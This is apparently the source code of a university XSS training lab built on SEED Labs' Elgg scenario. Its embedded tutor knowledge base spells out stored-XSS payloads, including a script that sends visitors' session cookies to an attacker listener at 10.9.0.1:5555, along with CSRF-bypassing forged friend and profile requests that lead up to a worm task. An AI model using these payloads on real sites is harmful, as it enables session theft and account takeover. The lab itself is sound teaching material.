            <div style={{ fontSize:11, color:C.muted, marginBottom:20 }}>PES University · Information Security Lab</div>

            {/* Full Name */}
            <div style={{ marginBottom:14 }}>
              <label style={labelStyle}>Full Name</label>
              <input value={name} onChange={e=>{setName(e.target.value);setErrors(p=>({...p,name:''}));}}
                onKeyDown={e=>e.key==='Enter'&&handleSubmit()} placeholder="e.g. Pooja Sharma"
                style={inputStyle(errors.name)}
                onFocus={e=>e.target.style.borderColor=C.accent} onBlur={e=>e.target.style.borderColor=errors.name?C.red:C.border} />
              {errors.name && <div style={{ fontSize:11, color:C.red, marginBottom:4 }}>{errors.name}</div>}
            </div>

            {/* SRN */}
            <div style={{ marginBottom:14 }}>
              <label style={labelStyle}>SRN (Student Registration Number)</label>
              <input value={srn} onChange={e=>{setSrn(e.target.value);setErrors(p=>({...p,srn:''}));}}
                onKeyDown={e=>e.key==='Enter'&&handleSubmit()} placeholder="e.g. PES1UG23AM203"
                style={{ ...inputStyle(errors.srn), textTransform:'uppercase', letterSpacing:1 }}
                onFocus={e=>e.target.style.borderColor=C.accent} onBlur={e=>e.target.style.borderColor=errors.srn?C.red:C.border} />
              {errors.srn && <div style={{ fontSize:11, color:C.red, marginBottom:4 }}>{errors.srn}</div>}
              {srn.trim() && !errors.srn && /^PES\d[A-Z]{2}\d{2}[A-Z]{2}\d{3}$/i.test(srn.trim()) && (
                <div style={{ fontSize:10, color:C.accent, marginBottom:4 }}>
                  ✓ Container ID: <strong>{srnToContainerId(srn.trim(), name.trim())}</strong>
                </div>
              )}
            </div>

            {/* Branch */}
            <div style={{ marginBottom:20 }}>
              <label style={labelStyle}>Branch / Department</label>
              <select value={branch} onChange={e=>{setBranch(e.target.value);setErrors(p=>({...p,branch:''}));}}
                style={{ width:'100%', background:C.bg, border:`1px solid ${errors.branch?C.red:C.border}`, borderRadius:12, padding:'12px 16px', color: branch?C.text:C.muted, fontSize:13, outline:'none', boxSizing:'border-box', fontFamily:'inherit', cursor:'pointer', appearance:'none' }}>
                <option value="" disabled>Select branch...</option>
                {BRANCH_OPTIONS.map(b => <option key={b} value={b} style={{ background:C.bg }}>{b}</option>)}
              </select>
              {errors.branch && <div style={{ fontSize:11, color:C.red, marginTop:4 }}>{errors.branch}</div>}
            </div>

            <button onClick={handleSubmit}
              style={{ width:'100%', background:C.accent, color:'#0d1117', fontWeight:900, fontSize:14, border:'none', borderRadius:12, padding:'14px 0', cursor:'pointer', fontFamily:'inherit' }}>
              🚀 Launch Lab Environment
            </button>
          </div>

          <div style={{ marginTop:28, fontSize:11, color:C.faint, display:'flex', gap:16, borderTop:`1px solid ${C.border}`, paddingTop:20, width:'100%', justifyContent:'center', flexWrap:'wrap' }}>
            <span>⏱ ~90 minutes</span><span style={{ color:C.border }}>•</span>
            <span>📊 430+ XP Available</span><span style={{ color:C.border }}>•</span>
            <span>🧩 6 Interactive Tasks</span><span style={{ color:C.border }}>•</span>
            <span>📖 SEED Labs 20.04</span>
          </div>
        </div>
      </div>
    );
  }

  // ── MAIN LAB COMPONENT ─────────────────────────────────────────────────────────
  function XSSLab() {
    const [isDarkMode, setIsDarkMode] = useState(() => {
      const saved = localStorage.getItem('xss-lab-theme');
      return saved ? JSON.parse(saved) : true; // Default to dark mode
    });

    useEffect(() => {
      localStorage.setItem('xss-lab-theme', JSON.stringify(isDarkMode));
      // Update body background and text color when theme changes
      const theme = getTheme(isDarkMode);
      document.body.style.backgroundColor = theme.bg;
      document.body.style.color = theme.text;
    }, [isDarkMode]);

    // Also ensure body styles are applied on initial mount
    useEffect(() => {
      const theme = getTheme(isDarkMode);
      document.body.style.backgroundColor = theme.bg;
      document.body.style.color = theme.text;
    }, []);

    const C = getTheme(isDarkMode);
    const [session, setSession] = useLocalStorage('xss_lab_v7_session', null);
    const [currentTaskId, setCurrentTaskId] = useState('task1');
    const [activeView, setActiveView] = useState('elgg');
    const [showCelebration, setShowCelebration] = useState(false);
    const [celebData, setCelebData] = useState(null);
    const [toast, setToast] = useState(null);
    const [hintsUsed, setHintsUsed] = useState({});
    const [completedMissions, setCompletedMissions] = useLocalStorage('xss_lab_v7_missions', []);
    const [httpCaptures, setHttpCaptures] = useState([]);

    const [loggedIn, setLoggedIn] = useState(null);
    const [page, setPage] = useState('home');
    const [viewingProfile, setViewingProfile] = useState(null);
    const [lastPayloadOwner, setLastPayloadOwner] = useState('samy');
    const [profiles, setProfiles] = useState({
      samy:    { briefDesc:'', aboutMe:'', aboutMeEditHtml:false, friends:[], posts:[] },
      alice:   { briefDesc:'', aboutMe:'', aboutMeEditHtml:false, friends:[], posts:[] },
      boby:    { briefDesc:'', aboutMe:'', aboutMeEditHtml:false, friends:[], posts:[] },
      charlie: { briefDesc:'', aboutMe:'', aboutMeEditHtml:false, friends:[], posts:[] },
    });

    const triggerToast = useCallback((message, type='info') => {
      setToast({ message, type });
      setTimeout(()=>setToast(null), 4000);
    }, []);

    const isTaskUnlocked = useCallback(() => true, []);

    const completeMission = useCallback((missionId, taskId) => {
      setCompletedMissions(prev => {
        if (prev.includes(missionId)) return prev;
        const steps = MISSION_STEPS[taskId] || [];
        const missionIndex = steps.findIndex(s=>s.id===missionId);
        if (missionIndex > 0 && taskId !== 'task1') {
          const prevMissionId = steps[missionIndex-1]?.id;
          if (prevMissionId && !prev.includes(prevMissionId)) return prev;
        }
        return [...prev, missionId];
      });
      const steps = MISSION_STEPS[taskId] || [];
      const step = steps.find(s=>s.id===missionId);
      if (!step) return;
      setSession(prev => {
        if (!prev) return prev;
        const updated = JSON.parse(JSON.stringify(prev));
        updated.score += step.xp;
        const allMissionIds = steps.map(s=>s.id);
        const updatedCompleted = [...(completedMissions||[]), missionId];
        const allDone = allMissionIds.every(id=>updatedCompleted.includes(id));
        if (allDone && !updated.tasks[taskId].completed) {
          updated.tasks[taskId].completed = true;
          const taskIndex = TASKS.findIndex(t=>t.id===taskId);
          if (taskIndex >= 0 && taskIndex < TASKS.length - 1) {
            const nextTaskId = TASKS[taskIndex+1].id;
            updated.tasks[nextTaskId].started = true;
          }
          const cur = TASKS.find(t=>t.id===taskId);
          setCelebData({ taskTitle:cur?.title?.split(' (')[0], xp:updated.score, taskNumber: cur?.number });
          setShowCelebration(true);
        }
        return updated;
      });
      triggerToast(`Mission complete! +${step.xp} XP`, 'success');
    }, [completedMissions, triggerToast]);

    const handleElggEvent = useCallback((type, user) => {
      const msgs = {
        alert_triggered:`🚨 XSS in ${user}'s browser!`, alert_stored:`⚠️ Alert payload stored`,
        cookie_triggered:`🍪 Cookie exposed in ${user}'s browser!`, cookie_stored:`⚠️ Cookie payload stored`,
        steal:`📡 Cookie exfiltrated from ${user}`, steal_self:`📡 Samy's cookie captured`,
        friend:`👥 Samy added to ${user}'s friends`, friend_stored:`⚠️ Friend-add payload stored`,
        profile:`✏️ ${user}'s profile overwritten`, profile_stored:`⚠️ Profile-overwrite payload stored`,
        worm:`🪱 Worm propagated to ${user}`, worm_stored:`⚠️ Worm stored`,
      };
      const toastType = type.includes('stored')?'info':(type==='friend'||type==='profile'||type==='worm')?'success':'error';
      triggerToast(msgs[type]||'Lab event', toastType);

      const ts = new Date().toLocaleTimeString();
      const elggTs = Math.floor(Date.now() / 1000);
      const elggToken = `lab_token_${elggTs}`;
      const viewerCookie = user ? `Elgg=${btoa(user + ':seedlab2024').slice(0, 22)}` : '';

      if (type === 'friend' && user && user !== 'samy') {
        setHttpCaptures(prev => [...prev, { id:Date.now(), timestamp:ts, method:'GET', url:`http://www.app.local/action/friends/add?friend=59&__elgg_ts=${elggTs}&__elgg_token=${elggToken}`, requestHeaders:{ Cookie:viewerCookie, Referer:'http://www.app.local/profile/samy', 'X-Requested-With':'XMLHttpRequest' }, requestBody:null, responseStatus:200, responseHeaders:{'Content-Type':'application/json'}, type:'ADD_FRIEND' }]);
      }
      if (type === 'profile' && user && user !== 'samy') {
        setHttpCaptures(prev => [...prev, { id:Date.now(), timestamp:ts, method:'POST', url:`http://www.app.local/action/profile/edit`, requestHeaders:{ Cookie:viewerCookie, 'Content-Type':'application/x-www-form-urlencoded', 'X-Requested-With':'XMLHttpRequest' }, requestBody:`__elgg_token=${elggToken}&__elgg_ts=${elggTs}&name=${user}&description=Samy+is+my+hero%21&accesslevel%5Bdescription%5D=2&guid=${USER_GUIDS[user]||56}`, responseStatus:200, responseHeaders:{'Content-Type':'application/json'}, type:'PROFILE_EDIT' }]);
      }
      if (type === 'steal' && user && user !== 'samy') {
        const fakeCookie = `Elgg=${btoa(user + ':seedlab2024').slice(0, 22)}`;
        setHttpCaptures(prev => [...prev, { id:Date.now(), timestamp:ts, method:'GET', url:`http://10.9.0.1:5555/?c=${encodeURIComponent(fakeCookie)}`, requestHeaders:{ Referer:'http://www.app.local/profile/samy', 'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)' }, requestBody:null, responseStatus:200, responseHeaders:{}, type:'COOKIE_STEAL' }]);
      }
      if (type === 'worm' && user && user !== 'samy') {
        setHttpCaptures(prev => [...prev, { id:Date.now(), timestamp:ts, method:'POST', url:`http://www.app.local/action/profile/edit`, requestHeaders:{ Cookie:viewerCookie, 'Content-Type':'application/x-www-form-urlencoded', 'X-Requested-With':'XMLHttpRequest' }, requestBody:`__elgg_token=${elggToken}&__elgg_ts=${elggTs}&name=${user}&description=%3Cscript+id%3D%22worm%22%3E...%5Bworm+replica%5D...%3C%2Fscript%3E&accesslevel%5Bdescription%5D=2&guid=${USER_GUIDS[user]||56}`, responseStatus:200, responseHeaders:{'Content-Type':'application/json'}, type:'PROFILE_EDIT' }]);
      }

      if (type==='alert_stored') completeMission('t1_alert_inject','task1');
      if (type==='alert_triggered'&&user!=='samy') { completeMission('t1_alert_inject','task1'); completeMission('t1_alert_victim','task1'); }
      if (type==='cookie_stored') { completeMission('t1_alert_inject','task1'); completeMission('t1_cookie_inject','task1'); }
      if (type==='cookie_triggered'&&user!=='samy') { completeMission('t1_cookie_inject','task1'); completeMission('t1_cookie_victim','task1'); }
      if (type==='steal_stored') { completeMission('t2_listener','task2'); completeMission('t2_payload','task2'); completeMission('t2_samy','task2'); }
      if (type==='steal_self'||(type==='steal'&&user==='samy')) completeMission('t2_samy','task2');
      if (type==='steal'&&user!=='samy') { completeMission('t2_samy','task2'); completeMission('t2_victim','task2'); }
      if (type==='friend_stored'&&user==='samy') completeMission('t3_payload','task3');
      if (type==='friend'&&user!=='samy') { completeMission('t3_payload','task3'); completeMission('t3_victim','task3'); }
      if (type==='profile_stored') completeMission('t4_payload','task4');
      if (type==='profile'&&user!=='samy') { completeMission('t4_payload','task4'); completeMission('t4_victim','task4'); }
      if (type==='worm_stored') completeMission('t5_payload','task5');
      if (type==='worm'&&user!=='samy') {
        if (user==='alice'&&!completedMissions.includes('t5_alice')) completeMission('t5_alice','task5');
        else if (user!=='alice'&&user!=='samy'&&completedMissions.includes('t5_alice')) completeMission('t5_chain','task5');
      }
      if (type.endsWith('_stored')) setLastPayloadOwner(user||loggedIn||'samy');
    }, [completeMission, completedMissions, loggedIn, triggerToast]);

    // Container ID derived from SRN: PES1UG23AM203 + "Pooja" → "AM203_Pooja"
    const memoizedStudentId = useMemo(
      () => srnToContainerId(session?.srn, session?.studentName) || 'default',
      [session?.srn, session?.studentName]
    );

    useEffect(() => { window.__xssLabStudentId = memoizedStudentId; }, [memoizedStudentId]);

    const handleStart = (name, srn, branch) => {
      setSession(makeSession(name, srn, branch));
      setCurrentTaskId('task1');
      setCompletedMissions([]);
      setHttpCaptures([]);
      triggerToast(`Welcome, ${name}! Container: ${srnToContainerId(srn, name)}`, 'success');
    };

    const handleReset = () => {
      if (!window.confirm('Reset all progress?')) return;
      setSession(null); setCompletedMissions([]); setHttpCaptures([]);
      triggerToast('Lab reset.','info');
    };

    const handleHint = (taskId) => {
      const task = TASKS.find(t=>t.id===taskId);
      const used = hintsUsed[taskId]||0;
      if (!task||used>=task.hints.length) { triggerToast('No more hints available.','info'); return; }
      if (!window.confirm('Reveal a hint? (-10 XP)')) return;
      setHintsUsed(p=>({...p,[taskId]:(p[taskId]||0)+1}));
      setSession(prev=>({...prev, score:Math.max(0,prev.score-10)}));
      alert(`💡 Hint #${used+1}:\n\n${task.hints[used]}`);
    };

    // AI task pop-up: fire a contextual question from the student-specific seeded pool
    // Each student gets a deterministic but different set of questions based on their name

    if (!session) return <StartScreen onStart={handleStart} isDarkMode={isDarkMode} setIsDarkMode={setIsDarkMode} />;

    const currentTask = TASKS.find(t=>t.id===currentTaskId)||TASKS[0];
    const totalScore = session.score || 0;

    return (
      <>
        <style>{`
          * { box-sizing: border-box; transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease, box-shadow 0.3s ease; }
          body { margin: 0; }
          ::-webkit-scrollbar { width: 6px; height: 6px; }
          ::-webkit-scrollbar-track { background: ${C.bg}; }
          ::-webkit-scrollbar-thumb { background: ${C.border}; border-radius: 3px; }
          @keyframes fadeUp { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
          @keyframes scaleUp { from{opacity:0;transform:scale(0.92)} to{opacity:1;transform:scale(1)} }
          .theme-toggle:hover { transform: scale(1.1) rotate(20deg) !important; }
        `}</style>

        <div style={{ height:'100vh', display:'flex', flexDirection:'column', background:C.bg, color:C.text, fontFamily:'system-ui,-apple-system,sans-serif', overflow:'hidden' }}>
          {/* HEADER */}
          <header style={{ background:C.bgSec, borderBottom:`1px solid ${C.border}`, padding:'12px 24px', display:'flex', alignItems:'center', justifyContent:'space-between', flexShrink:0, zIndex:10 }}>
            <div style={{ display:'flex', alignItems:'center', gap:10 }}>
              <span style={{ fontSize:20 }}>💉</span>
              <h1 style={{ margin:0, fontWeight:900, fontSize:16, color:C.text, letterSpacing:-0.5 }}>
                XSS Attack Lab
                <span style={{ fontSize:11, fontWeight:600, padding:'2px 8px', background:C.bgCard, border:`1px solid ${C.border}`, color:C.muted, borderRadius:99, textTransform:'uppercase', letterSpacing:1, marginLeft:8 }}>v7.0</span>
              </h1>
            </div>
            <div style={{ display:'flex', alignItems:'center', gap:14 }}>
              <div style={{ background:C.bgCard, border:`1px solid ${C.border}`, borderRadius:8, padding:'4px 12px', fontSize:12, fontWeight:600, display:'flex', alignItems:'center', gap:8 }}>
                <span style={{ color:C.muted }}>XP:</span>
                <span style={{ color:C.accent, fontWeight:900, fontSize:14 }}>{totalScore}</span>
              </div>
              <div style={{ display:'flex', flexDirection:'column', alignItems:'flex-end', gap:1 }}>
                <div style={{ fontSize:12, fontWeight:700, color:C.text }}>{session.studentName}</div>
                {session.srn && <div style={{ fontSize:10, color:C.accent, letterSpacing:0.5 }}>{session.srn}</div>}
                {session.branch && <div style={{ fontSize:10, color:C.muted }}>{session.branch} · Container: <span style={{ color:C.green }}>{memoizedStudentId}</span></div>}
              </div>
              <button onClick={handleReset} style={{ fontSize:11, background:'rgba(248,81,73,0.08)', border:'1px solid rgba(248,81,73,0.35)', color:C.red, padding:'6px 14px', borderRadius:8, cursor:'pointer', fontWeight:700, fontFamily:'inherit' }}>Reset Lab</button>
              <button className='theme-toggle' onClick={()=>setIsDarkMode(!isDarkMode)} title={isDarkMode?'Switch to Light Mode':'Switch to Dark Mode'} style={{ width:44, height:44, borderRadius:'50%', border:`1px solid ${C.border}`, background:C.bgCard, color:C.text, cursor:'pointer', display:'flex', alignItems:'center', justifyContent:'center', fontSize:20, fontFamily:'inherit', transition:'all 0.3s ease' }}>
                {isDarkMode ? '☀️' : '🌙'}
              </button>
            </div>
          </header>

          <div style={{ flex:1, display:'flex', overflow:'hidden' }}>
            {/* LEFT PANEL */}
            <aside style={{ width:420, flexShrink:0, borderRight:`1px solid ${C.border}`, display:'flex', flexDirection:'column', overflow:'hidden', background:`${C.bgSec}60` }}>
              {/* Progress strip */}
              {(() => {
                const total=TASKS.length; const completed=Object.values(session.tasks).filter(t=>t.completed).length; const pct=total>0?Math.round((completed/total)*100):0;
                return (
                  <div style={{ padding:'10px 14px', borderBottom:`1px solid ${C.border}`, background:C.bgSec, flexShrink:0 }}>
                    <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:5 }}>
                      <span style={{ fontSize:10, fontWeight:700, textTransform:'uppercase', letterSpacing:2, color:C.muted }}>Lab Progress</span>
                      <span style={{ fontSize:11, fontWeight:900, color:C.accent }}>{totalScore} XP · {pct}%</span>
                    </div>
                    <div style={{ height:5, borderRadius:99, background:C.border2, overflow:'hidden' }}>
                      <div style={{ height:'100%', width:`${pct}%`, background:C.accent, borderRadius:99, transition:'width 0.5s' }} />
                    </div>
                    <div style={{ marginTop:4, fontSize:10, color:C.faint }}>{completed} / {total} tasks completed</div>
                  </div>
                );
              })()}

              {/* Task nav pills */}
              <div style={{ padding:'10px 10px 6px', borderBottom:`1px solid ${C.border}`, flexShrink:0 }}>
                <div style={{ display:'flex', flexWrap:'wrap', gap:5 }}>
                  {TASKS.map(task => {
                    const st = session.tasks[task.id];
                    const isActive = task.id===currentTaskId;
                    const isDone = st?.completed;
                    const unlocked = isTaskUnlocked(task.id);
                    return (
                      <button key={task.id}
                        onClick={()=>{ if(unlocked) setCurrentTaskId(task.id); else triggerToast(`Complete Task ${task.number-1} first to unlock this task.`, 'info'); }}
                        title={!unlocked ? `🔒 Complete Task ${task.number-1} to unlock` : ''}
                        style={{ display:'flex', alignItems:'center', gap:5, padding:'4px 10px', borderRadius:20, border:`1px solid ${isActive?C.accent:isDone?'rgba(0,212,170,0.35)':unlocked?C.border:'rgba(100,100,100,0.3)'}`, background:isActive?'rgba(0,212,170,0.12)':isDone?'rgba(0,212,170,0.05)':'transparent', cursor:unlocked?'pointer':'not-allowed', fontFamily:'inherit', opacity:unlocked?1:0.5 }}>
                        <span style={{ width:16, height:16, borderRadius:'50%', background:!unlocked?'rgba(100,100,100,0.3)':isActive?C.accent:isDone?'rgba(0,212,170,0.25)':C.bgHov, color:!unlocked?C.faint:isActive?'#0d1117':isDone?C.accent:C.muted, fontSize:9, fontWeight:900, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0 }}>
                          {!unlocked?'🔒':isDone?'✓':task.number}
                        </span>
                        <span style={{ fontSize:10, fontWeight:isActive?700:500, color:!unlocked?C.faint:isActive?C.accent:isDone?C.accent:C.muted, whiteSpace:'nowrap' }}>Task {task.number}</span>
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Task Guide */}
              <div style={{ flex:1, overflowY:'auto' }}>
                {isTaskUnlocked(currentTaskId)
                  ? <TaskGuide task={currentTask} session={session} completedMissions={completedMissions} onHint={handleHint} hintsUsed={hintsUsed} isDarkMode={isDarkMode} />
                  : <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', height:300, gap:12, color:C.muted, textAlign:'center', padding:24 }}>
                      <span style={{ fontSize:48 }}>🔒</span>
                      <div style={{ fontSize:14, fontWeight:700, color:C.text }}>Task {currentTask.number} Locked</div>
                      <div style={{ fontSize:12, color:C.muted, lineHeight:1.6 }}>Complete <strong style={{ color:C.accent }}>Task {currentTask.number - 1}</strong> to unlock this task.</div>
                    </div>
                }
              </div>
            </aside>

            {/* RIGHT PANEL */}
            <main style={{ flex:1, display:'flex', flexDirection:'column', background:C.bg, overflow:'hidden' }}>
              {/* Tab bar */}
              <div style={{ background:`${C.bgSec}50`, borderBottom:`1px solid ${C.border}`, padding:'0 12px', display:'flex', alignItems:'center', gap:2, height:44, flexShrink:0 }}>
                {[
                  { id:'elgg',     label:'🌐 Elgg Portal' },
                  { id:'terminal', label:'💻 Terminal' },
                  { id:'headers',  label:`📡 HTTP Headers${httpCaptures.length>0?` (${httpCaptures.length})`:''}` },
                ].map(tab => (
                  <button key={tab.id} onClick={()=>setActiveView(tab.id)}
                    style={{ padding:'0 14px', height:'100%', background:'transparent', border:'none', borderBottom:`2px solid ${activeView===tab.id?C.accent:'transparent'}`, color:activeView===tab.id?C.accent:C.muted, fontWeight:activeView===tab.id?700:400, fontSize:12, cursor:'pointer', fontFamily:'inherit', whiteSpace:'nowrap', position:'relative' }}>
                    {tab.label}
                    {tab.id==='headers' && httpCaptures.length>0 && activeView!=='headers' && <span style={{ position:'absolute', top:8, right:6, width:7, height:7, borderRadius:'50%', background:C.blue }} />}
                  </button>
                ))}
                <div style={{ flex:1 }} />
                {/* Ask AI inline question button */}
                <div style={{ fontSize:10, color:C.faint, marginLeft:8 }}>Task {currentTask.number}/{TASKS.length}</div>
              </div>

              {/* Tab content */}
              <div style={{ flex:1, overflow:'hidden', position:'relative' }}>
                {/* Elgg Portal */}
                <div style={{ position:'absolute', inset:0, display:activeView==='elgg'?'flex':'none', flexDirection:'column', overflowY:'auto' }}>
                  <div style={{ fontSize:11, color:C.muted, margin:'12px 16px 0', background:C.bgSec, border:`1px solid ${C.border}`, borderRadius:8, padding:'7px 12px', flexShrink:0 }}>
                    🌐 <strong style={{ color:C.text }}>Social Media Simulator</strong> — Login as <strong style={{ color:C.red }}>samy</strong> → Edit Profile → About Me → <strong style={{ color:C.yellow }}>tick "Edit HTML"</strong> → paste payload → Save. Then login as a victim and visit Samy's profile.
                  </div>
                  <div style={{ padding:'12px 16px 16px' }}>
                    <SocialMediaPortal onEvent={handleElggEvent} loggedIn={loggedIn} setLoggedIn={setLoggedIn} page={page} setPage={setPage} viewingProfile={viewingProfile} setViewingProfile={setViewingProfile} profiles={profiles} setProfiles={setProfiles} lastPayloadOwner={lastPayloadOwner} />
                  </div>
                </div>

                {/* Terminal */}
                <div style={{ position:'absolute', inset:0, display:activeView==='terminal'?'flex':'none', flexDirection:'column', overflow:'hidden' }}>
                  <RealTerminal studentId={memoizedStudentId} />
                </div>

                {/* HTTP Headers */}
                <div style={{ position:'absolute', inset:0, display:activeView==='headers'?'flex':'none', flexDirection:'column', overflow:'hidden' }}>
                  <HttpHeadersPanel studentId={memoizedStudentId} externalCaptures={httpCaptures} />
                </div>



              </div>
            </main>
          </div>
        </div>

        {/* CELEBRATION */}
        {showCelebration && celebData && (
          <div style={{ position:'fixed', inset:0, background:'rgba(0,0,0,0.75)', display:'flex', alignItems:'center', justifyContent:'center', zIndex:1000, backdropFilter:'blur(4px)' }}>
            <div style={{ background:C.bgSec, border:`1px solid ${C.accent}`, borderRadius:20, padding:'40px 48px', textAlign:'center', animation:'scaleUp 0.4s ease', boxShadow:`0 0 50px rgba(0,212,170,0.25)`, maxWidth:380 }}>
              <div style={{ fontSize:52, marginBottom:14 }}>🏆</div>
              <div style={{ fontSize:20, fontWeight:900, color:C.text, marginBottom:4 }}>Task Complete!</div>
              <div style={{ fontSize:14, color:C.text, fontWeight:700, marginBottom:20 }}>{celebData.taskTitle}</div>
              <div style={{ background:C.bgCard, border:`1px solid ${C.border}`, borderRadius:12, padding:'14px 20px', marginBottom:20 }}>
                <div style={{ fontSize:10, textTransform:'uppercase', letterSpacing:2, color:C.muted, marginBottom:4 }}>Total XP</div>
                <div style={{ fontSize:30, fontWeight:900, color:C.accent }}>{totalScore} XP</div>
              </div>
              <div style={{ fontSize:12, color:C.accent, marginBottom:16 }}>🔓 Next task is now unlocked!</div>
              <button onClick={()=>{
                const taskNum = celebData?.taskNumber;
                setShowCelebration(false);
                setCelebData(null);
                // Auto-popup a question for the just-completed task
                if (taskNum) {
                  setTimeout(() => triggerAiQuestion(taskNum), 350);
                }
              }} style={{ background:C.accent, color:'#0d1117', border:'none', borderRadius:12, padding:'10px 28px', cursor:'pointer', fontSize:13, fontWeight:900, fontFamily:'inherit' }}>Continue → Answer a Quick Question!</button>
            </div>
          </div>
        )}

        {/* TOAST */}
        {toast && (
          <div style={{ position:'fixed', bottom:20, right:20, zIndex:9999, background:C.bgSec, border:`1px solid ${{success:C.accent,error:C.red,info:C.blue}[toast.type]||C.border}`, borderLeft:`4px solid ${{success:C.accent,error:C.red,info:C.blue}[toast.type]||C.accent}`, color:C.text, padding:'12px 16px', borderRadius:10, fontSize:12, fontWeight:600, maxWidth:340, display:'flex', alignItems:'center', gap:10, animation:'fadeUp 0.3s ease', fontFamily:'system-ui,sans-serif' }}>
            <span style={{ fontSize:16 }}>{{'success':'✅','error':'🚨','info':'ℹ️'}[toast.type]}</span>
            {toast.message}
          </div>
        )}
      </>

    );
  }

  window.XSSLab = XSSLab;

  // ══════════════════════════════════════════════════════════════════════════════
// CYBERMENTOR — AI-Powered Floating Chatbot Widget
// Paste this BELOW your existing XSSLab component code (after `window.XSSLab = XSSLab;`)
// Uses Gemini API directly from the browser via fetch
// ══════════════════════════════════════════════════════════════════════════════
//
// SETUP:
//   1. Get a free Gemini API key: https://aistudio.google.com/app/apikey
//   2. Replace "YOUR_GEMINI_API_KEY" below with your actual key
//   3. Paste this entire block at the bottom of your XssLab_v2.jsx file
//   4. Add <CyberMentorWidget /> inside your XSSLab return(), right before the final </>
//
// ══════════════════════════════════════════════════════════════════════════════

// ── CONFIG ───────────────────────────────────────────────────────────────────
// ANTHROPIC_API_KEY: Get from https://console.anthropic.com/keys
// Paste the key inside the callGemini() function below where it says "PASTE_YOUR_ANTHROPIC_KEY_HERE"

// ── LAB KNOWLEDGE BASE (used as RAG context) ─────────────────────────────────
const LAB_KNOWLEDGE = {
  task1: {
    name: "Task 1 — Basic XSS Alert Injection",
    theory: "Stored XSS occurs when user-supplied HTML is saved to a database and rendered for other users without sanitisation. The `<script>` tag tells the browser to execute JavaScript. The Brief Description field renders raw HTML directly; the About Me field uses TinyMCE which strips script tags unless 'Edit HTML' is ticked.",
    objective: "Inject a <script>alert('XSS');</script> into Samy's Brief Description. Then swap it for alert(document.cookie) to display the viewer's session cookie.",
    hints: [
      "Which field accepts raw HTML without any editor sitting in the way?",
      "Try the Brief Description field — it renders HTML directly. Paste your script tag there.",
      "The payload is: <script>alert('XSS');</script> — paste it in Brief Description and save.",
    ],
    commonMistakes: [
      "Pasting into About Me without ticking 'Edit HTML' — TinyMCE strips the script",
      "Viewing your own profile as Samy — the alert fires for VICTIMS, not the attacker",
      "Using single quotes inside double-quoted HTML attributes — escape them properly",
    ],
    fullSolution: "1. Log in as samy. 2. Edit Profile → Brief Description → paste <script>alert('XSS');</script> → Save. 3. Log in as alice → click Samy's name → alert fires.",
  },
  task2: {
    name: "Task 2 — Cookie Theft via netcat",
    theory: "An <img> tag triggers an HTTP GET request to its src URL — even if the URL returns nothing. By making the src point to the attacker's server with the cookie as a query parameter, the browser sends the cookie to netcat automatically. escape() URL-encodes special chars like = and ; so they survive in the URL.",
    objective: "Steal Alice's session cookie by injecting an <img> payload into Samy's About Me. Capture it with `nc -lknv 5555` in the Terminal tab.",
    hints: [
      "How can you make a browser send data to an external server without the user knowing?",
      "An <img src='...?data=...'> fires a GET request silently. Put the cookie in the URL parameter.",
      "Start netcat FIRST: `nc -lknv 5555` in the Terminal tab. Then have Alice visit Samy's profile.",
    ],
    commonMistakes: [
      "Starting netcat AFTER Alice visits — the request is already gone, nobody was listening",
      "Forgetting to tick 'Edit HTML' in About Me — TinyMCE will strip the script",
      "Using the wrong IP — the payload must point to 10.9.0.1:5555 (attacker machine)",
      "Not wrapping the cookie in escape() — special characters break the URL",
    ],
    fullSolution: "1. Terminal tab: run `nc -lknv 5555`. 2. Login as samy → About Me → tick Edit HTML → paste: <script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');</script> → Save. 3. Login as alice → visit Samy's profile → cookie appears in netcat.",
  },
  task3: {
    name: "Task 3 — Forged Friend-Add (AJAX GET)",
    theory: "Elgg uses CSRF tokens (__elgg_ts and __elgg_token) to verify requests are genuine. But when the XSS payload runs inside the victim's own browser, it can READ these tokens from the page and include them in a forged request — bypassing CSRF protection entirely. The XMLHttpRequest goes to /action/friends/add with Samy's GUID (59) as the friend parameter.",
    objective: "Make every visitor of Samy's profile automatically add Samy as a friend, using a window.onload AJAX GET payload.",
    hints: [
      "How does Elgg know which user to add as a friend? Where would you find Samy's unique ID?",
      "Look in the Members sidebar — each user's GUID is shown. Samy's GUID is 59.",
      "You need two CSRF tokens from the page: elgg.security.token.__elgg_ts and __elgg_token. The payload reads them dynamically.",
    ],
    commonMistakes: [
      "Forgetting window.onload — without it, elgg.security.token is undefined when the script runs",
      "Using a hardcoded CSRF token — tokens expire, you must read them fresh from elgg.security.token",
      "Not ticking Edit HTML in About Me",
      "Testing as Samy — Samy can't add himself as a friend",
    ],
    fullSolution: "Login as samy → About Me → Edit HTML → paste the Task 3 payload (reads __elgg_ts, __elgg_token, builds GET request to /action/friends/add?friend=59) → Save → Login as alice → Visit Samy → check Alice's friends list.",
  },
  task4: {
    name: "Task 4 — Profile Overwrite (AJAX POST)",
    theory: "Instead of a GET request, editing a profile requires a POST with a URL-encoded body. The Content-Type header must be application/x-www-form-urlencoded or Elgg ignores the body. The samyGuid guard (if guid != 59) prevents Samy from overwriting his own payload when he visits his own profile.",
    objective: "Overwrite every victim's About Me with 'Samy is my hero!' using a forged POST request.",
    hints: [
      "What HTTP method does a form submission use? Is GET appropriate for changing data?",
      "You need setRequestHeader('Content-Type', 'application/x-www-form-urlencoded') — without it, the server ignores the body.",
      "Without the `if (elgg.session.user.guid != 59)` guard, what happens when Samy views his own profile?",
    ],
    commonMistakes: [
      "Missing Content-Type header — server won't parse the POST body",
      "Removing the samyGuid guard — Samy visits his profile → payload overwrites itself → attack broken",
      "Not including guid in the POST body — Elgg needs to know whose profile to update",
      "Forgetting accesslevel[description]=2 — profile may save but as private",
    ],
    fullSolution: "The payload builds a POST body with CSRF tokens, name, description='Samy is my hero!', accesslevel, and guid. The if(guid != samyGuid) guard skips execution when Samy views his own profile. Login as alice → visit Samy → alice's About Me changes.",
  },
  task5: {
    name: "Task 5 — Self-Propagating XSS Worm",
